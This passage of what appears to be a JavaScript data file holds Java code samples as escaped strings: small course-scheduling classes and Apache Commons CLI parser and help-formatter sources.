		     * @param options the specified Options
		     * @param arguments the command line arguments
		     * @param properties command line option name-value pairs
		     * @param stopAtNonOption if &lttt&gttrue&lt/tt&gt an unrecognized argument stops
		     *     the parsing and the remaining arguments are added to the 
		     *     {@link CommandLine}s args list. If &lttt&gtfalse&lt/tt&gt an unrecognized
		     *     argument triggers a ParseException.
		     *
		     * @return the list of atomic option and value tokens
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     */
		    /* To maintain binary compatibility, this is commented out.
		       It is still in the abstract Parser class, so most users will
		       still reap the benefit.
		    CommandLine parse(Options options, String[] arguments, Properties properties, boolean stopAtNonOption)
		            throws ParseException;
		     */
		}`
	},
	ai8: {
		type: 'java',
		code: `
		/* Course
		* A custom class used to store information about courses
		* Takes a string of form: Faculty Course# LEC LecNum
		* Contains get methods for all private variables
		 */


		public class Course {


		    private final String faculty;
		    private final int cnum;
		    private final int lsec;

		    public Course(String s){
		        String[] arr = s.split(" ");
		        if(arr.length &gt 4) {
		            int count = 0;
		            for (String st : arr) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr.length - count];
		            int i = 0;
		            for (String st : arr){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr = ndata;
		        }
		            this.faculty = arr[0].trim();
		            this.cnum = Integer.parseInt(arr[1].trim());
		            this.lsec = Integer.parseInt(arr[3].trim());
		    }

		    public Course(String faculty, int cnum, int lsec){
		        this.faculty = faculty;
		        this.cnum = cnum;
		        this.lsec = lsec;
		    }
		    public String getFaculty() { return this.faculty; }
		    public int getCourseNum() { return this.cnum; }
		    public int getLecSec() { return this.lsec; }
		}`
	},
	ai9: {
		type: 'java',
		code: `
		import java.util.ArrayList;
		import java.util.List;

		/* Course Slot
		* A custom class to ease the storing of courses in a data structure
		* Takes an abstract data type of form: Day StartTime CourseMax CourseMinn
		* Contains get methods for all private variables
		 */
		public class CourseSlot {

		    public final String day;
		    public final String start;
		    public final int max;
		    public final int min;
		    public int count;
		    public List&ltCourse&gt courses = new ArrayList&lt&gt();

		    public CourseSlot(String day, String start, int max, int min) {
		        this.day = day;
		        this.start = start;
		        this.max = max;
		        this.min = min;
		        this.count = 0;
		    }

		    public CourseSlot(String day, String start, int max, int min, Course c) {
		        this.day = day;
		        this.start = start;
		        this.max = max;
		        this.min = min;
		        this.count = 1;
		        this.courses.add(c);
		    }


		    public String getDay() { return this.day; }
		    public String getStart() { return this.start; }
		    public int getMax() { return this.max; }
		    public int getMin() { return this.min;}
		    public int getCount() { return this.count; }
		}`
	},
	ai10: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.util.ArrayList;
		import java.util.Enumeration;
		import java.util.List;
		import java.util.Properties;

		/**
		 * Default parser.
		 * 
		 * @version $Id: DefaultParser.java 1783175 2017-02-16 07:52:05Z britter $
		 * @since 1.3
		 */
		public class DefaultParser implements CommandLineParser
		{
		    /** The command-line instance. */
		    protected CommandLine cmd;
		    
		    /** The current options. */
		    protected Options options;

		    /**
		     * Flag indicating how unrecognized tokens are handled. &lttt&gttrue&lt/tt&gt to stop
		     * the parsing and add the remaining tokens to the args list.
		     * &lttt&gtfalse&lt/tt&gt to throw an exception. 
		     */
		    protected boolean stopAtNonOption;

		    /** The token currently processed. */
		    protected String currentToken;
		 
		    /** The last option parsed. */
		    protected Option currentOption;
		 
		    /** Flag indicating if tokens should no longer be analyzed and simply added as arguments of the command line. */
		    protected boolean skipParsing;
		 
		    /** The required options and groups expected to be found when parsing the command line. */
		    protected List expectedOpts;
		 
		    public CommandLine parse(Options options, String[] arguments) throws ParseException
		    {
		        return parse(options, arguments, null);
		    }

		    /**
		     * Parse the arguments according to the specified options and properties.
		     *
		     * @param options    the specified Options
		     * @param arguments  the command line arguments
		     * @param properties command line option name-value pairs
		     * @return the list of atomic option and value tokens
		     *
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     */
		    public CommandLine parse(Options options, String[] arguments, Properties properties) throws ParseException
		    {
		        return parse(options, arguments, properties, false);
		    }

		    public CommandLine parse(Options options, String[] arguments, boolean stopAtNonOption) throws ParseException
		    {
		        return parse(options, arguments, null, stopAtNonOption);
		    }

		    /**
		     * Parse the arguments according to the specified options and properties.
		     *
		     * @param options         the specified Options
		     * @param arguments       the command line arguments
		     * @param properties      command line option name-value pairs
		     * @param stopAtNonOption if &lttt&gttrue&lt/tt&gt an unrecognized argument stops
		     *     the parsing and the remaining arguments are added to the 
		     *     {@link CommandLine}s args list. If &lttt&gtfalse&lt/tt&gt an unrecognized
		     *     argument triggers a ParseException.
		     *
		     * @return the list of atomic option and value tokens
		     * @throws ParseException if there are any problems encountered
		     * while parsing the command line tokens.
		     */
		    public CommandLine parse(Options options, String[] arguments, Properties properties, boolean stopAtNonOption)
		            throws ParseException
		    {
		        this.options = options;
		        this.stopAtNonOption = stopAtNonOption;
		        skipParsing = false;
		        currentOption = null;
		        expectedOpts = new ArrayList(options.getRequiredOptions());

		        // clear the data from the groups
		        for (OptionGroup group : options.getOptionGroups())
		        {
		            group.setSelected(null);
		        }

		        cmd = new CommandLine();

		        if (arguments != null)
		        {
		            for (String argument : arguments)
		            {
		                handleToken(argument);
		            }
		        }

		        // check the arguments of the last option
		        checkRequiredArgs();

		        // add the default options
		        handleProperties(properties);

		        checkRequiredOptions();

		        return cmd;
		    }

		    /**
		     * Sets the values of Options using the values in &ltcode&gtproperties&lt/code&gt.
		     *
		     * @param properties The value properties to be processed.
		     */
		    private void handleProperties(Properties properties) throws ParseException
		    {
		        if (properties == null)
		        {
		            return;
		        }

		        for (Enumeration&lt?&gt e = properties.propertyNames(); e.hasMoreElements();)
		        {
		            String option = e.nextElement().toString();

		            Option opt = options.getOption(option);
		            if (opt == null)
		            {
		                throw new UnrecognizedOptionException("Default option wasn't defined", option);
		            }

		            // if the option is part of a group, check if another option of the group has been selected
		            OptionGroup group = options.getOptionGroup(opt);
		            boolean selected = group != null && group.getSelected() != null;

		            if (!cmd.hasOption(option) && !selected)
		            {
		                // get the value from the properties
		                String value = properties.getProperty(option);

		                if (opt.hasArg())
		                {
		                    if (opt.getValues() == null || opt.getValues().length == 0)
		                    {
		                        opt.addValueForProcessing(value);
		                    }
		                }
		                else if (!("yes".equalsIgnoreCase(value)
		                        || "true".equalsIgnoreCase(value)
		                        || "1".equalsIgnoreCase(value)))
		                {
		                    // if the value is not yes, true or 1 then don't add the option to the CommandLine
		                    continue;
		                }

		                handleOption(opt);
		                currentOption = null;
		            }
		        }
		    }

		    /**
		     * Throws a {@link MissingOptionException} if all of the required options
		     * are not present.
		     *
		     * @throws MissingOptionException if any of the required Options
		     * are not present.
		     */
		    private void checkRequiredOptions() throws MissingOptionException
		    {
		        // if there are required options that have not been processed
		        if (!expectedOpts.isEmpty())
		        {
		            throw new MissingOptionException(expectedOpts);
		        }
		    }

		    /**
		     * Throw a {@link MissingArgumentException} if the current option
		     * didn't receive the number of arguments expected.
		     */
		    private void checkRequiredArgs() throws ParseException
		    {
		        if (currentOption != null && currentOption.requiresArg())
		        {
		            throw new MissingArgumentException(currentOption);
		        }
		    }

		    /**
		     * Handle any command line token.
		     *
		     * @param token the command line token to handle
		     * @throws ParseException
		     */
		    private void handleToken(String token) throws ParseException
		    {
		        currentToken = token;

		        if (skipParsing)
		        {
		            cmd.addArg(token);
		        }
		        else if ("--".equals(token))
		        {
		            skipParsing = true;
		        }
		        else if (currentOption != null && currentOption.acceptsArg() && isArgument(token))
		        {
		            currentOption.addValueForProcessing(Util.stripLeadingAndTrailingQuotes(token));
		        }
		        else if (token.startsWith("--"))
		        {
		            handleLongOption(token);
		        }
		        else if (token.startsWith("-") && !"-".equals(token))
		        {
		            handleShortAndLongOption(token);
		        }
		        else
		        {
		            handleUnknownToken(token);
		        }

		        if (currentOption != null && !currentOption.acceptsArg())
		        {
		            currentOption = null;
		        }
		    }

		    /**
		     * Returns true is the token is a valid argument.
		     *
		     * @param token
		     */
		    private boolean isArgument(String token)
		    {
		        return !isOption(token) || isNegativeNumber(token);
		    }

		    /**
		     * Check if the token is a negative number.
		     *
		     * @param token
		     */
		    private boolean isNegativeNumber(String token)
		    {
		        try
		        {
		            Double.parseDouble(token);
		            return true;
		        }
		        catch (NumberFormatException e)
		        {
		            return false;
		        }
		    }

		    /**
		     * Tells if the token looks like an option.
		     *
		     * @param token
		     */
		    private boolean isOption(String token)
		    {
		        return isLongOption(token) || isShortOption(token);
		    }

		    /**
		     * Tells if the token looks like a short option.
		     * 
		     * @param token
		     */
		    private boolean isShortOption(String token)
		    {
		        // short options (-S, -SV, -S=V, -SV1=V2, -S1S2)
		        if (!token.startsWith("-") || token.length() == 1)
		        {
		            return false;
		        }

		        // remove leading "-" and "=value"
		        int pos = token.indexOf("=");
		        String optName = pos == -1 ? token.substring(1) : token.substring(1, pos);
		        if (options.hasShortOption(optName))
		        {
		            return true;
		        }
		        // check for several concatenated short options
		        return optName.length() &gt 0 && options.hasShortOption(String.valueOf(optName.charAt(0)));
		    }

		    /**
		     * Tells if the token looks like a long option.
		     *
		     * @param token
		     */
		    private boolean isLongOption(String token)
		    {
		        if (!token.startsWith("-") || token.length() == 1)
		        {
		            return false;
		        }

		        int pos = token.indexOf("=");
		        String t = pos == -1 ? token : token.substring(0, pos);

		        if (!options.getMatchingOptions(t).isEmpty())
		        {
		            // long or partial long options (--L, -L, --L=V, -L=V, --l, --l=V)
		            return true;
		        }
		        else if (getLongPrefix(token) != null && !token.startsWith("--"))
		        {
		            // -LV
		            return true;
		        }

		        return false;
		    }

		    /**
		     * Handles an unknown token. If the token starts with a dash an 
		     * UnrecognizedOptionException is thrown. Otherwise the token is added 
		     * to the arguments of the command line. If the stopAtNonOption flag 
		     * is set, this stops the parsing and the remaining tokens are added 
		     * as-is in the arguments of the command line.
		     *
		     * @param token the command line token to handle
		     */
		    private void handleUnknownToken(String token) throws ParseException
		    {
		        if (token.startsWith("-") && token.length() &gt 1 && !stopAtNonOption)
		        {
		            throw new UnrecognizedOptionException("Unrecognized option: " + token, token);
		        }

		        cmd.addArg(token);
		        if (stopAtNonOption)
		        {
		            skipParsing = true;
		        }
		    }

		    /**
		     * Handles the following tokens:
		     *
		     * --L
		     * --L=V
		     * --L V
		     * --l
		     *
		     * @param token the command line token to handle
		     */
		    private void handleLongOption(String token) throws ParseException
		    {
		        if (token.indexOf('=') == -1)
		        {
		            handleLongOptionWithoutEqual(token);
		        }
		        else
		        {
		            handleLongOptionWithEqual(token);
		        }
		    }

		    /**
		     * Handles the following tokens:
		     *
		     * --L
		     * -L
		     * --l
		     * -l
		     * 
		     * @param token the command line token to handle
		     */
		    private void handleLongOptionWithoutEqual(String token) throws ParseException
		    {
		        List&ltString&gt matchingOpts = options.getMatchingOptions(token);
		        if (matchingOpts.isEmpty())
		        {
		            handleUnknownToken(currentToken);
		        }
		        else if (matchingOpts.size() &gt 1)
		        {
		            throw new AmbiguousOptionException(token, matchingOpts);
		        }
		        else
		        {
		            handleOption(options.getOption(matchingOpts.get(0)));
		        }
		    }

		    /**
		     * Handles the following tokens:
		     *
		     * --L=V
		     * -L=V
		     * --l=V
		     * -l=V
		     *
		     * @param token the command line token to handle
		     */
		    private void handleLongOptionWithEqual(String token) throws ParseException
		    {
		        int pos = token.indexOf('=');

		        String value = token.substring(pos + 1);

		        String opt = token.substring(0, pos);

		        List&ltString&gt matchingOpts = options.getMatchingOptions(opt);
		        if (matchingOpts.isEmpty())
		        {
		            handleUnknownToken(currentToken);
		        }
		        else if (matchingOpts.size() &gt 1)
		        {
		            throw new AmbiguousOptionException(opt, matchingOpts);
		        }
		        else
		        {
		            Option option = options.getOption(matchingOpts.get(0));

		            if (option.acceptsArg())
		            {
		                handleOption(option);
		                currentOption.addValueForProcessing(value);
		                currentOption = null;
		            }
		            else
		            {
		                handleUnknownToken(currentToken);
		            }
		        }
		    }

		    /**
		     * Handles the following tokens:
		     *
		     * -S
		     * -SV
		     * -S V
		     * -S=V
		     * -S1S2
		     * -S1S2 V
		     * -SV1=V2
		     *
		     * -L
		     * -LV
		     * -L V
		     * -L=V
		     * -l
		     *
		     * @param token the command line token to handle
		     */
		    private void handleShortAndLongOption(String token) throws ParseException
		    {
		        String t = Util.stripLeadingHyphens(token);

		        int pos = t.indexOf('=');

		        if (t.length() == 1)
		        {
		            // -S
		            if (options.hasShortOption(t))
		            {
		                handleOption(options.getOption(t));
		            }
		            else
		            {
		                handleUnknownToken(token);
		            }
		        }
		        else if (pos == -1)
		        {
		            // no equal sign found (-xxx)
		            if (options.hasShortOption(t))
		            {
		                handleOption(options.getOption(t));
		            }
		            else if (!options.getMatchingOptions(t).isEmpty())
		            {
		                // -L or -l
		                handleLongOptionWithoutEqual(token);
		            }
		            else
		            {
		                // look for a long prefix (-Xmx512m)
		                String opt = getLongPrefix(t);

		                if (opt != null && options.getOption(opt).acceptsArg())
		                {
		                    handleOption(options.getOption(opt));
		                    currentOption.addValueForProcessing(t.substring(opt.length()));
		                    currentOption = null;
		                }
		                else if (isJavaProperty(t))
		                {
		                    // -SV1 (-Dflag)
		                    handleOption(options.getOption(t.substring(0, 1)));
		                    currentOption.addValueForProcessing(t.substring(1));
		                    currentOption = null;
		                }
		                else
		                {
		                    // -S1S2S3 or -S1S2V
		                    handleConcatenatedOptions(token);
		                }
		            }
		        }
		        else
		        {
		            // equal sign found (-xxx=yyy)
		            String opt = t.substring(0, pos);
		            String value = t.substring(pos + 1);

		            if (opt.length() == 1)
		            {
		                // -S=V
		                Option option = options.getOption(opt);
		                if (option != null && option.acceptsArg())
		                {
		                    handleOption(option);
		                    currentOption.addValueForProcessing(value);
		                    currentOption = null;
		                }
		                else
		                {
		                    handleUnknownToken(token);
		                }
		            }
		            else if (isJavaProperty(opt))
		            {
		                // -SV1=V2 (-Dkey=value)
		                handleOption(options.getOption(opt.substring(0, 1)));
		                currentOption.addValueForProcessing(opt.substring(1));
		                currentOption.addValueForProcessing(value);
		                currentOption = null;
		            }
		            else
		            {
		                // -L=V or -l=V
		                handleLongOptionWithEqual(token);
		            }
		        }
		    }

		    /**
		     * Search for a prefix that is the long name of an option (-Xmx512m)
		     *
		     * @param token
		     */
		    private String getLongPrefix(String token)
		    {
		        String t = Util.stripLeadingHyphens(token);

		        int i;
		        String opt = null;
		        for (i = t.length() - 2; i &gt 1; i--)
		        {
		            String prefix = t.substring(0, i);
		            if (options.hasLongOption(prefix))
		            {
		                opt = prefix;
		                break;
		            }
		        }
		        
		        return opt;
		    }

		    /**
		     * Check if the specified token is a Java-like property (-Dkey=value).
		     */
		    private boolean isJavaProperty(String token)
		    {
		        String opt = token.substring(0, 1);
		        Option option = options.getOption(opt);

		        return option != null && (option.getArgs() &gt= 2 || option.getArgs() == Option.UNLIMITED_VALUES);
		    }

		    private void handleOption(Option option) throws ParseException
		    {
		        // check the previous option before handling the next one
		        checkRequiredArgs();

		        option = (Option) option.clone();

		        updateRequiredOptions(option);

		        cmd.addOption(option);

		        if (option.hasArg())
		        {
		            currentOption = option;
		        }
		        else
		        {
		            currentOption = null;
		        }
		    }

		    /**
		     * Removes the option or its group from the list of expected elements.
		     *
		     * @param option
		     */
		    private void updateRequiredOptions(Option option) throws AlreadySelectedException
		    {
		        if (option.isRequired())
		        {
		            expectedOpts.remove(option.getKey());
		        }

		        // if the option is in an OptionGroup make that option the selected option of the group
		        if (options.getOptionGroup(option) != null)
		        {
		            OptionGroup group = options.getOptionGroup(option);

		            if (group.isRequired())
		            {
		                expectedOpts.remove(group);
		            }

		            group.setSelected(option);
		        }
		    }

		    /**
		     * Breaks &ltcode&gttoken&lt/code&gt into its constituent parts
		     * using the following algorithm.
		     *
		     * &ltul&gt
		     *  &ltli&gtignore the first character ("&ltb&gt-&lt/b&gt")&lt/li&gt
		     *  &ltli&gtfor each remaining character check if an {@link Option}
		     *  exists with that id.&lt/li&gt
		     *  &ltli&gtif an {@link Option} does exist then add that character
		     *  prepended with "&ltb&gt-&lt/b&gt" to the list of processed tokens.&lt/li&gt
		     *  &ltli&gtif the {@link Option} can have an argument value and there
		     *  are remaining characters in the token then add the remaining
		     *  characters as a token to the list of processed tokens.&lt/li&gt
		     *  &ltli&gtif an {@link Option} does &ltb&gtNOT&lt/b&gt exist &ltb&gtAND&lt/b&gt
		     *  &ltcode&gtstopAtNonOption&lt/code&gt &ltb&gtIS&lt/b&gt set then add the special token
		     *  "&ltb&gt--&lt/b&gt" followed by the remaining characters and also
		     *  the remaining tokens directly to the processed tokens list.&lt/li&gt
		     *  &ltli&gtif an {@link Option} does &ltb&gtNOT&lt/b&gt exist &ltb&gtAND&lt/b&gt
		     *  &ltcode&gtstopAtNonOption&lt/code&gt &ltb&gtIS NOT&lt/b&gt set then add that
		     *  character prepended with "&ltb&gt-&lt/b&gt".&lt/li&gt
		     * &lt/ul&gt
		     *
		     * @param token The current token to be &ltb&gtburst&lt/b&gt
		     * at the first non-Option encountered.
		     * @throws ParseException if there are any problems encountered
		     *                        while parsing the command line token.
		     */
		    protected void handleConcatenatedOptions(String token) throws ParseException
		    {
		        for (int i = 1; i &lt token.length(); i++)
		        {
		            String ch = String.valueOf(token.charAt(i));

		            if (options.hasOption(ch))
		            {
		                handleOption(options.getOption(ch));

		                if (currentOption != null && token.length() != i + 1)
		                {
		                    // add the trail as an argument of the option
		                    currentOption.addValueForProcessing(token.substring(i + 1));
		                    break;
		                }
		            }
		            else
		            {
		                handleUnknownToken(stopAtNonOption && i &gt 1 ? token.substring(i) : token);
		                break;
		            }
		        }
		    }
		}`
	},
	ai11: {
		type: 'java',
		code: `
		import java.util.ArrayList;
		import java.util.List;
		import java.util.Vector;

		class Fact{
		    public int score = 0;
		    List&ltCourseSlot&gt courseSlotList= new ArrayList&lt&gt();
		    List&ltLabSlot&gt labsSlotList = new ArrayList&lt&gt();
		    List&ltCourse&gt unassCourse = new ArrayList&lt&gt();
		    List&ltLab&gt unassLab = new ArrayList&lt&gt();
		    List&ltAssignments&gt assignments = new ArrayList&lt&gt();
		    List&ltCourse&gt conflict = new ArrayList&lt&gt();

		    public Fact(List&ltCourseSlot&gt courseSlotList,
		                List&ltLabSlot&gt labSlotList, List&ltCourse&gt unassCourse, List&ltLab&gt unassLab){
		        this.courseSlotList = courseSlotList;
		        this.labsSlotList = labSlotList;
		        this.unassCourse = unassCourse;
		        this.unassLab = unassLab;

		    }

		}`
	},
	ai12: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.util.ArrayList;
		import java.util.List;

		/**
		 * The class GnuParser provides an implementation of the
		 * {@link Parser#flatten(Options, String[], boolean) flatten} method.
		 *
		 * @version $Id: GnuParser.java 1445352 2013-02-12 20:48:19Z tn $
		 * @deprecated since 1.3, use the {@link DefaultParser} instead
		 */
		@Deprecated
		public class GnuParser extends Parser
		{
		    /**
		     * This flatten method does so using the following rules:
		     * &ltol&gt
		     *   &ltli&gtIf an {@link Option} exists for the first character of
		     *   the &ltcode&gtarguments&lt/code&gt entry &ltb&gtAND&lt/b&gt an {@link Option}
		     *   does not exist for the whole &ltcode&gtargument&lt/code&gt then
		     *   add the first character as an option to the processed tokens
		     *   list e.g. "-D" and add the rest of the entry to the also.&lt/li&gt
		     *   &ltli&gtOtherwise just add the token to the processed tokens list.&lt/li&gt
		     * &lt/ol&gt
		     *
		     * @param options         The Options to parse the arguments by.
		     * @param arguments       The arguments that have to be flattened.
		     * @param stopAtNonOption specifies whether to stop flattening when
		     *                        a non option has been encountered
		     * @return a String array of the flattened arguments
		     */
		    @Override
		    protected String[] flatten(Options options, String[] arguments, boolean stopAtNonOption)
		    {
		        List&ltString&gt tokens = new ArrayList&ltString&gt();

		        boolean eatTheRest = false;

		        for (int i = 0; i &lt arguments.length; i++)
		        {
		            String arg = arguments[i];

		            if ("--".equals(arg))
		            {
		                eatTheRest = true;
		                tokens.add("--");
		            }
		            else if ("-".equals(arg))
		            {
		                tokens.add("-");
		            }
		            else if (arg.startsWith("-"))
		            {
		                String opt = Util.stripLeadingHyphens(arg);

		                if (options.hasOption(opt))
		                {
		                    tokens.add(arg);
		                }
		                else
		                {
		                    if (opt.indexOf('=') != -1 && options.hasOption(opt.substring(0, opt.indexOf('='))))
		                    {
		                        // the format is --foo=value or -foo=value
		                        tokens.add(arg.substring(0, arg.indexOf('='))); // --foo
		                        tokens.add(arg.substring(arg.indexOf('=') + 1)); // value
		                    }
		                    else if (options.hasOption(arg.substring(0, 2)))
		                    {
		                        // the format is a special properties option (-Dproperty=value)
		                        tokens.add(arg.substring(0, 2)); // -D
		                        tokens.add(arg.substring(2)); // property=value
		                    }
		                    else
		                    {
		                        eatTheRest = stopAtNonOption;
		                        tokens.add(arg);
		                    }
		                }
		            }
		            else
		            {
		                tokens.add(arg);
		            }

		            if (eatTheRest)
		            {
		                for (i++; i &lt arguments.length; i++) //NOPMD
		                {
		                    tokens.add(arguments[i]);
		                }
		            }
		        }

		        return tokens.toArray(new String[tokens.size()]);
		    }
		}`
	},
	ai13: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.BufferedReader;
		import java.io.IOException;
		import java.io.PrintWriter;
		import java.io.Serializable;
		import java.io.StringReader;
		import java.util.ArrayList;
		import java.util.Arrays;
		import java.util.Collection;
		import java.util.Collections;
		import java.util.Comparator;
		import java.util.Iterator;
		import java.util.List;

		/**
		 * A formatter of help messages for command line options.
		 *
		 * &ltp&gtExample:&lt/p&gt
		 * 
		 * &ltpre&gt
		 * Options options = new Options();
		 * options.addOption(OptionBuilder.withLongOpt("file")
		 *                                .withDescription("The file to be processed")
		 *                                .hasArg()
		 *                                .withArgName("FILE")
		 *                                .isRequired()
		 *                                .create('f'));
		 * options.addOption(OptionBuilder.withLongOpt("version")
		 *                                .withDescription("Print the version of the application")
		 *                                .create('v'));
		 * options.addOption(OptionBuilder.withLongOpt("help").create('h'));
		 * 
		 * String header = "Do something useful with an input file\\n\\n";
		 * String footer = "\\nPlease report issues at http://example.com/issues";
		 * 
		 * HelpFormatter formatter = new HelpFormatter();
		 * formatter.printHelp("myapp", header, options, footer, true);
		 * &lt/pre&gt
		 * 
		 * This produces the following output:
		 * 
		 * &ltpre&gt
		 * usage: myapp -f &lt;FILE&gt; [-h] [-v]
		 * Do something useful with an input file
		 * 
		 *  -f,--file &lt;FILE&gt;   The file to be processed
		 *  -h,--help
		 *  -v,--version       Print the version of the application
		 * 
		 * Please report issues at http://example.com/issues
		 * &lt/pre&gt
		 * 
		 * @version $Id: HelpFormatter.java 1677407 2015-05-03 14:31:12Z britter $
		 */
		public class HelpFormatter
		{
		    // --------------------------------------------------------------- Constants

		    /** default number of characters per line */
		    public static final int DEFAULT_WIDTH = 74;

		    /** default padding to the left of each line */
		    public static final int DEFAULT_LEFT_PAD = 1;

		    /** number of space characters to be prefixed to each description line */
		    public static final int DEFAULT_DESC_PAD = 3;

		    /** the string to display at the beginning of the usage statement */
		    public static final String DEFAULT_SYNTAX_PREFIX = "usage: ";

		    /** default prefix for shortOpts */
		    public static final String DEFAULT_OPT_PREFIX = "-";

		    /** default prefix for long Option */
		    public static final String DEFAULT_LONG_OPT_PREFIX = "--";

		    /** 
		     * default separator displayed between a long Option and its value
		     * 
		     * @since 1.3
		     **/
		    public static final String DEFAULT_LONG_OPT_SEPARATOR = " ";

		    /** default name for an argument */
		    public static final String DEFAULT_ARG_NAME = "arg";

		    // -------------------------------------------------------------- Attributes

		    /**
		     * number of characters per line
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setWidth methods instead.
		     */
		    @Deprecated
		    public int defaultWidth = DEFAULT_WIDTH;

		    /**
		     * amount of padding to the left of each line
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setLeftPadding methods instead.
		     */
		    @Deprecated
		    public int defaultLeftPad = DEFAULT_LEFT_PAD;

		    /**
		     * the number of characters of padding to be prefixed
		     * to each description line
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setDescPadding methods instead.
		     */
		    @Deprecated
		    public int defaultDescPad = DEFAULT_DESC_PAD;

		    /**
		     * the string to display at the beginning of the usage statement
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setSyntaxPrefix methods instead.
		     */
		    @Deprecated
		    public String defaultSyntaxPrefix = DEFAULT_SYNTAX_PREFIX;

		    /**
		     * the new line string
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setNewLine methods instead.
		     */
		    @Deprecated
		    public String defaultNewLine = System.getProperty("line.separator");

		    /**
		     * the shortOpt prefix
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setOptPrefix methods instead.
		     */
		    @Deprecated
		    public String defaultOptPrefix = DEFAULT_OPT_PREFIX;

		    /**
		     * the long Opt prefix
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setLongOptPrefix methods instead.
		     */
		    @Deprecated
		    public String defaultLongOptPrefix = DEFAULT_LONG_OPT_PREFIX;

		    /**
		     * the name of the argument
		     *
		     * @deprecated Scope will be made private for next major version
		     * - use get/setArgName methods instead.
		     */
		    @Deprecated
		    public String defaultArgName = DEFAULT_ARG_NAME;

		    /**
		     * Comparator used to sort the options when they output in help text
		     * 
		     * Defaults to case-insensitive alphabetical sorting by option key
		     */
		    protected Comparator&ltOption&gt optionComparator = new OptionComparator();

		    /** The separator displayed between the long option and its value. */
		    private String longOptSeparator = DEFAULT_LONG_OPT_SEPARATOR;

		    /**
		     * Sets the 'width'.
		     *
		     * @param width the new value of 'width'
		     */
		    public void setWidth(int width)
		    {
		        this.defaultWidth = width;
		    }

		    /**
		     * Returns the 'width'.
		     *
		     * @return the 'width'
		     */
		    public int getWidth()
		    {
		        return defaultWidth;
		    }

		    /**
		     * Sets the 'leftPadding'.
		     *
		     * @param padding the new value of 'leftPadding'
		     */
		    public void setLeftPadding(int padding)
		    {
		        this.defaultLeftPad = padding;
		    }

		    /**
		     * Returns the 'leftPadding'.
		     *
		     * @return the 'leftPadding'
		     */
		    public int getLeftPadding()
		    {
		        return defaultLeftPad;
		    }

		    /**
		     * Sets the 'descPadding'.
		     *
		     * @param padding the new value of 'descPadding'
		     */
		    public void setDescPadding(int padding)
		    {
		        this.defaultDescPad = padding;
		    }

		    /**
		     * Returns the 'descPadding'.
		     *
		     * @return the 'descPadding'
		     */
		    public int getDescPadding()
		    {
		        return defaultDescPad;
		    }

		    /**
		     * Sets the 'syntaxPrefix'.
		     *
		     * @param prefix the new value of 'syntaxPrefix'
		     */
		    public void setSyntaxPrefix(String prefix)
		    {
		        this.defaultSyntaxPrefix = prefix;
		    }

		    /**
		     * Returns the 'syntaxPrefix'.
		     *
		     * @return the 'syntaxPrefix'
		     */
		    public String getSyntaxPrefix()
		    {
		        return defaultSyntaxPrefix;
		    }

		    /**
		     * Sets the 'newLine'.
		     *
		     * @param newline the new value of 'newLine'
		     */
		    public void setNewLine(String newline)
		    {
		        this.defaultNewLine = newline;
		    }

		    /**
		     * Returns the 'newLine'.
		     *
		     * @return the 'newLine'
		     */
		    public String getNewLine()
		    {
		        return defaultNewLine;
		    }

		    /**
		     * Sets the 'optPrefix'.
		     *
		     * @param prefix the new value of 'optPrefix'
		     */
		    public void setOptPrefix(String prefix)
		    {
		        this.defaultOptPrefix = prefix;
		    }

		    /**
		     * Returns the 'optPrefix'.
		     *
		     * @return the 'optPrefix'
		     */
		    public String getOptPrefix()
		    {
		        return defaultOptPrefix;
		    }

		    /**
		     * Sets the 'longOptPrefix'.
		     *
		     * @param prefix the new value of 'longOptPrefix'
		     */
		    public void setLongOptPrefix(String prefix)
		    {
		        this.defaultLongOptPrefix = prefix;
		    }

		    /**
		     * Returns the 'longOptPrefix'.
		     *
		     * @return the 'longOptPrefix'
		     */
		    public String getLongOptPrefix()
		    {
		        return defaultLongOptPrefix;
		    }

		    /**
		     * Set the separator displayed between a long option and its value.
		     * Ensure that the separator specified is supported by the parser used,
		     * typically ' ' or '='.
		     * 
